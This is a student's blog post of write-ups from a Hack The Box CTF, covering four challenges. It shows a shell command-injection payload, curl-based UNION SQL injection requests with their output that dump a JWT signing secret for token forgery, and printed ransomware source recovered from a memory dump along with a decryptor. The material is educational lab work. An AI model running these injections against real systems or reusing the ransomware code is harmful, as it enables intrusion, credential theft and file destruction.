---
layout: post
category: writeup
---


![](assets/images/usfbanner.webp)

![](assets/images/htb-ctf-usf-1st.png)

- HTB hosted a CTF locally here at USF under our business platform
- we got to participate and ended up being 1st!
- my writeup on the various challenges

### DeLorean Clock 

#### Dr. Brown wants to jump on the web 3.0 bandwagon and make his DeLorean controllable via blockchain! He made a web interface of the DeLorean time clock but launching the DeLorean to a miscalculated date can create a time paradox, the result of which could cause a chain reaction that would unravel the very fabric of the space-time continuum and destroy the entire universe! Can you test if the web interface is accurate and secure?

- this challenge was quite easy as there wasn't much to attack
- we were faced with a singular input that seems like it maps to `utils.py` in the provided files:

{% highlight python %}
import subprocess, os
from application import main

generate = lambda x: os.urandom(x).hex()

def format_date(timestr):
    try:
        formatCMD = f'date -d "{timestr}" +"%h %d %Y %H %M"'
        formatDate = subprocess.getoutput(formatCMD)
    except:
        formatDate = 'Jan 01 1970 00 00'
    return formatDate
{% endhighlight %}

- that is an obvious command injection
- i search other files and i don't see any sanitization so i can input something like this

```
$(find / -name flag.txt 2>/dev/null)
```

![](assets/images/htb-ctf-usf-find-flag.png)

- all is left is to read the flag

```
$(cat /app/flag.txt)
```

![](assets/images/htb-ctf-usf-deloeran-clock-flag.png)

- flag: `HTB{d0nt_p4ss_Us3r_Inpu7s_t0_c0mm4ndl1n3}`

### MadDog Memorial 

#### You have been tasked with the pentesting engagement on the memorial website of the great Buford "Mad Dog" Tannen, who was a true patriotic countryman and the pride of Hill Valley! The Tannen family has asked you to find out any loopholes in the system and see if the admin account can be compromised. They don't want any teenager or a mad scientist to break in and discover the secrets they are hiding!

- this was a much more fun challenge, it involved an interesting exploit chain
- it starts with understanding the database structure:

```
DEVKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)
PRODKEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1)

mysql -u root << EOF
CREATE DATABASE tannen_memorial;

CREATE TABLE tannen_memorial.keystore (
  kid int(11) NOT NULL AUTO_INCREMENT,
  secret varchar(255) NOT NULL,
  PRIMARY KEY (kid)
);

INSERT INTO tannen_memorial.keystore VALUES (1,'${DEVKEY}');
INSERT INTO tannen_memorial.keystore VALUES (2,'${PRODKEY}');
```

- this creates a database called `tannen_memorial` and in that database it creates a table called `keystore`, in there it has `kid` and `secret`.
- from there it inserts completely random values into the keystore secrets
- the next thing we need to understand is the jwt implementation, that exists in the `JSTHelpers.js` file:

```
sign(data, kid='2') {
		return new Promise(async (resolve, reject) => {
			try {
                keyData = keyStore.filter(i => i.kid == kid)
                if(keyData.length === 0) reject();
                resolve(jwt.sign(data, keyData[0].secret, {
			        algorithm: 'HS256',
			        header: { kid: kid }
		        }));
            } catch (e) {
				reject(e);
			}
        });
	}
```
- this clearly shows that it grabs the secret from the keystore where kid = 2 and sets it as the jwt secret
- so in my head at this point, i'm thinking if there is any way i can read the database i can possibly get the secret and exploit the jwt token
- which takes us to `database.js`:

```
   async getPost(id) {
        return new Promise(async (resolve, reject) => {
            let stmt = `SELECT * FROM posts WHERE id='${id}'`;
            this.connection.query(stmt, (err, result) => {
                if(err)
                    reject(err)
                resolve(result)
            })
        });
    }
```
- this function has a clear and obvious sqli in the `/posts/:id` endpoint
- i'll try a union sqli and attempt to read the secret, i already know the table and column name so all i'll need to do is find the column # count.

- start by curling the `/posts/1` endpoint

```
$ curl http://161.35.173.232:31576/posts/1 -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/mad1.jpg" alt="Post unavailable!">
                  <h4 class="card-title mb-1">The Hero</h4>
                  <p class="card-text">Our Ancestor, Buford Tannen, was regarded as a hero for catching the thieves who robbed the Pine City Stage back in 1885. Although he was suspected of robbing the stagecoach earlier, he cleared his name later by identifying the real culprit. He guided the chief marshal to the house of a man named Seamus McFly, where they discovered a payroll from the stagecoach in the house. Hill valley recognized Buford as a hero for his assistance in finding the robbers.</p>
```

- i next try to union select 1 column:

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201--%20- -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <h4 class="card-title">ERROR</h4>
                  <p class="card-text">Opps! Something went wrong!</p>
```

- that results in an error, so i'll start adding #'s until i get different feedback

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201,2,3,4--%20- -s | grep card  
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/3" alt="Post unavailable!">
                  <h4 class="card-title mb-1">2</h4>
                  <p class="card-text">4</p>
```

- this returns the values 2 and 4 as seen in the h4 and p tags
- i can now try to read a secret from the keystore values

```
$ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%20keystore--%20- -s | grep card 
              <div class="card ancient-card card-grid" style="max-width: 30rem; min-width: 20rem">
                <div class="card-body pt-0">
                  <img class="card-img-top" src="/static/images/3" alt="Post unavailable!">
                  <h4 class="card-title mb-1">yEgEoSOKXmT50LM</h4>
                  <p class="card-text">4</p>
```

- bingo! i got a secret, this must be the dev secret aka kid 1 since that is the secret that i read. i can try and see if that works by editing it in jwt.io

![](assets/images/htb-ctf-usf-maddog-jwt.png)

- note that i change the kid to 1 and the secret key at the bottom to the correct value
- i take that cookie and i submit it in my browser -> refresh -> and read the flag on the main page!

![](assets/images/htb-ctf-usf-maddog-flag.png)

- flag: `HTB{t4nn3n_fr4m3d_th3_mcFly}`

### Unfinished Business

#### While in prison, he developed a ransomware to infect Marty's computer. Now, every time Marty reboots his computer, his files get encrypted. Without being able to access them, Marty cannot follow the plan Mr.Brown sent to him, in order to escape the Old West before it is too late.

- this challenge was amazing, i loved it so much
- it wasn't necessarily hard but it was def fun!
- starting off with a memdump and an encrypted pdf file
- a quick recap of things i looked for using vol.py:
  - sus connections 
  - sus command lines
  - sus reg keys

- at this point i wanted to look through files and i was already aware that `marty` is the user:

```
HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Downloads
Volatility Foundation Volatility Framework 2.6.1
0x000000003e298038      2      0 R--rwd \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
0x000000003e29e4d8      5      0 R--r-d \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
0x000000003e2a1910      2      0 R--rwd \Device\HarddiskVolume1\Users\Marty\Downloads\desktop.ini
0x000000003e693be8      5      0 R--r-d \Device\HarddiskVolume1\Users\Marty\Downloads\Rans.exe
```

- bingo! i see that there's a `Rans.exe` file that likely stands for ransomware
- i dump it and try to reverse it but its very complicated with a ton going on, i highly doubt this is the route so i take a step back and look for other files that start with `Rans`

```
HTB vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Rans
Volatility Foundation Volatility Framework 2.6.1
0x000000003f4b7038      6      0 R--r-d \Device\HarddiskVolume1\Users\Marty\AppData\Local\Temp\.net\Rans\LnxLq3C8fV66obdZMxa9l3pHdLe0wqc=\Rans.dll
```

- bam! `Rans.dll`, i download it and throw it in dnspy and i get the following code:

#### original code found in dnspy
```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace Rans
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			string sDir = string.Format("C:\\Users\\{0}\\Documents", Environment.UserName);
			Program.CheckRunKey();
			Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002070 File Offset: 0x00000270
		public static void CheckRunKey()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			if (!registryKey.GetValueNames().Contains("Rans"))
			{
				FileInfo fileInfo = new FileInfo("Rans.exe");
				registryKey.SetValue("Rans", fileInfo.FullName);
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020BC File Offset: 0x000002BC
		public static void ParseDir(string sDir, string key)
		{
			List<string> list = new List<string>
			{
				"jpg",
				"mp3",
				"mp4",
				"png",
				"pdf",
				"txt",
				"doc",
				"docx",
				"docm",
				"ppt",
				"pptx",
				"xls",
				"xlsx"
			};
			foreach (string text in Directory.GetFiles(sDir))
			{
				string[] array = text.Split('.', StringSplitOptions.None);
				string item = array[1];
				string text2 = array[array.Length - 1];
				if (list.Contains(item) && !text2.Equals("enc"))
				{
					Console.WriteLine("Encrypting: " + text);
					Program.EncryptFile(text, key);
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021BC File Offset: 0x000003BC
		public static void EncryptFile(string file, string key)
		{
			byte[] array = File.ReadAllBytes(file);
			byte[] iv = new byte[]
			{
				99,
				104,
				105,
				99,
				107,
				101,
				110,
				32,
				77,
				97,
				114,
				116,
				121,
				33,
				33,
				33
			};
			SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
			HashAlgorithm hashAlgorithm = MD5.Create();
			symmetricAlgorithm.BlockSize = 128;
			symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
			symmetricAlgorithm.IV = iv;
			using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".enc", FileMode.Create, FileAccess.Write), symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(array, 0, array.Length);
			}
			File.Delete(file);
		}
	}
}
```

- this looks like the encryptor, its reading files in the documents dir and encrypting them, all it'll take is slight reverse engineering and we can get the c# program to decrypt it:

#### edited file to decrypt the data
```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace decryptor
{

    class Program
    {
        private static void Main(string[] args)
        {
            string sDir = string.Format("c:/tmp", Environment.UserName);
            Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
        }

        public static void ParseDir(string sDir, string key)
        {
            List<string> list = new List<string>
            {
                "enc","pdf"
            };
            foreach (string text in Directory.GetFiles(sDir))
            {
                string[] array = text.Split('.', StringSplitOptions.None);
                string item = array[1];
                string text2 = array[array.Length - 1];
                if (list.Contains(item) && text2.Equals("enc"))
                {
                    Program.DecryptFile(text, key);
                }
            }
        }
        public static void DecryptFile(string file, string key)
        {
            byte[] array = File.ReadAllBytes(file);
            byte[] iv = new byte[]
            {
                99,
                104,
                105,
                99,
                107,
                101,
                110,
                32,
                77,
                97,
                114,
                116,
                121,
                33,
                33,
                33
            };
            SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
            HashAlgorithm hashAlgorithm = MD5.Create();
            symmetricAlgorithm.BlockSize = 128;
            symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
            symmetricAlgorithm.IV = iv;

            using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".dec", FileMode.Create), symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(array, 0, array.Length);
            }
            File.Delete(file);
        }
    }
}
```

- main changes:
  - limiting file look up to enc in the tmp dir
  - allowing enc files
  - adjusting the code in the `EncryptFile` to decrypt instead

running it results in a decrypted file and the flag:

![](assets/images/htb-ctf-usf-unfinshed-business.png)

- flag: `HTB{4n0the3r_0n3_T4nn3n_d3f34t3d}`


### Heatflow 

#### The flux capacitor v2.0 requires even more jigowatts to run stably! To properly dissipate the excessive amount of heat produced by the new prototype we have gathered the required data to design an adequate cooling system by measuring the temperature across five key parts of the circuit board every minute. Can you help us analyze the data?

- i hated this one
- horrible
- it sucks

- To begin, we are handed a.csv file and informed that the numbers in it are inconsistent. I opened it in Excel and calculated the mean of all the data. I used conditional formatting to find outliers and quickly recognized items that looked like words when I highlighted all the ones that were above average. I changed it to below average and presto:

![](assets/images/htb-ctf-usf-excel.png)

- flag `HTB{M0R3_P0W3R_M0R3_HE4T}`


that's all.

best, gerbsec